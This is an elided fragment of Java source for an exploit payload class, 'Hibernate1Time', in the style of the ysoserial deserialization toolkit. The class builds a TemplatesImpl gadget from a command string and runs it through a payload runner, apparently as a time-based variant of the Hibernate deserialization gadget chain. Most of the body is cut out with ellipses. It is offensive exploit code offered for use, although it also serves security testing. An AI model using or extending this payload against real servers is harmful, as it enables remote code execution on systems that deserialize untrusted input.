...
public class Hibernate1Time implements ObjectPayload<Object>, DynamicDependencies {
    ...
    public Object getObject ( String command ) throws Exception {
        Object tpl = Gadgets.createTemplatesImplTime(command);
    ...
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Hibernate1Time.class, args);
    }
}
